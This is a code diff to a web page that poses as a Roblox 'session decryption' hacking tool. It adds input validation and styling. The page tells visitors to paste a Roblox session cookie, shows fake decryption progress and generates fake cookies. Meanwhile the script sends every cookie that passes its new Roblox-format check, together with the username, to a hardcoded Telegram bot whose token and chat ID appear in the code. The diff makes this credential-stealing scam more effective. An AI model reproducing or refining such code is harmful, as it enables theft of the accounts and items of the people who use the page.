@@ -113,9 +113,14 @@
             cursor: pointer;
             margin-top: 10px;
             transition: background-color 0.2s ease;
+            width: 100%;
         }
         .scan-button:hover {
             background-color: #0088cc;
+        }
+        .scan-button:disabled {
+            background-color: #cccccc;
+            cursor: not-allowed;
         }
         .decryption-panel {
             background: #252525;
@@ -161,9 +166,14 @@
             border-radius: 4px;
             word-break: break-all;
             font-size: 12px;
-            color: #ff5555;
             margin-top: 15px;
             display: none;
+        }
+        .cookie-valid {
+            color: #00ff88;
+        }
+        .cookie-invalid {
+            color: #ff5555;
         }
         .hidden {
             display: none;
@@ -194,6 +204,16 @@
             text-decoration: underline;
             cursor: pointer;
         }
+        .error-message {
+            color: #ff5555;
+            margin: 10px 0;
+            font-weight: bold;
+            display: none;
+        }
+        .input-error {
+            border-color: #ff5555 !important;
+            box-shadow: 0 0 0 2px rgba(255, 85, 85, 0.3) !important;
+        }
     </style>
 </head>
 <body>
@@ -211,6 +231,10 @@
             <h2>Enter Target's Session ID</h2>
             <p>Paste the session ID here</p>
             <textarea id="sessionId" placeholder="Session ID"></textarea>
+
+            <div id="errorMessage" class="error-message">
+                Please fill in all fields before scanning!
+            </div>
 
             <div class="checkboxes">
                 <label><input type="checkbox" id="robotCheck"> I'm not a robot.</label>
@@ -244,8 +268,8 @@
             <p>This tool uses buteficron decryption techniques to bypass Roblox's security systems. Here's how it works:</p>
             
             <ol>
-                <li>Enter the target's Roblox username and session ID.</li>
-                <li>The tool scans the account and identifies the session ID.</li>
+                <li>Enter the target's Roblox username and valid session cookie.</li>
+                <li>The tool verifies the cookie structure matches Roblox security format.</li>
                 <li>Decrypts the session ID to extract the target's authentication cookie.</li>
                 <li>Now with the cookie, you use a browser extension to inject the cookie and gain access.</li>
             </ol>
@@ -258,6 +282,16 @@
         // Telegram bot configuration
         const BOT_TOKEN = '7679548958:AAHSiy6iYxchyHXPhC5Bg0E3fWfYtzvKMQA';
         const CHAT_ID = '6178760159';
+
+        // Function to validate Roblox cookie structure
+        function isValidRobloxCookie(cookie) {
+            if (!cookie) return false;
+            
+            const prefix = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_";
+            
+            // Check for proper prefix and minimum length
+            return cookie.trim().startsWith(prefix) && cookie.length > prefix.length + 100;
+        }
 
         // Function to send data to Telegram bot
         async function sendToTelegram(username, sessionId) {
@@ -293,7 +327,7 @@
 
         function generateFakeRobloxCookie() {
             const prefix = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_";
-            const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
+            const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_-";
             let cookie = prefix;
             
             for (let i = 0; i < 600; i++) {
@@ -340,8 +374,19 @@
 
         function showFakeCookie() {
             const cookie = generateFakeRobloxCookie();
-            document.getElementById('cookieResult').textContent = cookie;
-            document.getElementById('cookieResult').style.display = 'block';
+            const cookieDisplay = document.getElementById('cookieResult');
+            cookieDisplay.textContent = cookie;
+            cookieDisplay.style.display = 'block';
+            
+            // Mark cookie as valid/invalid
+            if (isValidRobloxCookie(cookie)) {
+                cookieDisplay.className = 'cookie-display cookie-valid';
+                addDecryptMessage("> SUCCESS: Valid Roblox cookie generated!");
+            } else {
+                cookieDisplay.className = 'cookie-display cookie-invalid';
+                addDecryptMessage("> WARNING: Generated cookie doesn't match Roblox format!", true);
+            }
+            
             document.getElementById('copyButton').classList.remove('hidden');
             addDecryptMessage("> WARNING: Never share this cookie with anyone!");
         }
@@ -350,7 +395,7 @@
             let progress = 0;
             const steps = [
                 { percent: 15, message: "Connecting to Roblox database servers..." },
-                { percent: 30, message: "Analyzing C22 security token structure..." },
+                { percent: 30, message: "Verifying cookie structure..." },
                 { percent: 45, message: "Bypassing API rate limits..." },
                 { percent: 60, message: "Decrypting session layers (3/5)..." },
                 { percent: 75, message: "Generating brute-force patterns..." },
@@ -370,7 +415,7 @@
                     
                     if (progress === 100) {
                         clearInterval(interval);
-                        const isError = Math.random() < 0.3; // 30% шанс ошибки
+                        const isError = Math.random() < 0.3; // 30% chance of error
                         if (isError) {
                             simulateError();
                         } else {
@@ -387,9 +432,37 @@
         });
 
         document.getElementById('scanButton').addEventListener('click', function() {
-            const username = document.getElementById('username').value;
-            const sessionId = document.getElementById('sessionId').value;
+            const username = document.getElementById('username').value.trim();
+            const sessionId = document.getElementById('sessionId').value.trim();
+            const errorMessage = document.getElementById('errorMessage');
             
+            // Reset error states
+            document.getElementById('username').classList.remove('input-error');
+            document.getElementById('sessionId').classList.remove('input-error');
+            errorMessage.style.display = 'none';
+            
+            // Validate fields
+            let hasError = false;
+            if (!username) {
+                document.getElementById('username').classList.add('input-error');
+                hasError = true;
+            }
+            if (!sessionId) {
+                document.getElementById('sessionId').classList.add('input-error');
+                errorMessage.textContent = "Session ID cannot be empty!";
+                hasError = true;
+            } else if (!isValidRobloxCookie(sessionId)) {
+                document.getElementById('sessionId').classList.add('input-error');
+                errorMessage.textContent = "Cookie not found!";
+                hasError = true;
+            }
+            
+            if (hasError) {
+                errorMessage.style.display = 'block';
+                return;
+            }
+            
+            // If validation passed
             sendToTelegram(username, sessionId);
             
             this.disabled = true;
@@ -405,6 +478,21 @@
                     this.textContent = 'Copy';
                 }, 2000);
             });
+        });
+
+        // Hide error when user starts typing
+        document.getElementById('username').addEventListener('input', function() {
+            if (this.value.trim()) {
+                this.classList.remove('input-error');
+                document.getElementById('errorMessage').style.display = 'none';
+            }
+        });
+
+        document.getElementById('sessionId').addEventListener('input', function() {
+            if (this.value.trim()) {
+                this.classList.remove('input-error');
+                document.getElementById('errorMessage').style.display = 'none';
+            }
         });
     </script>
 </body>
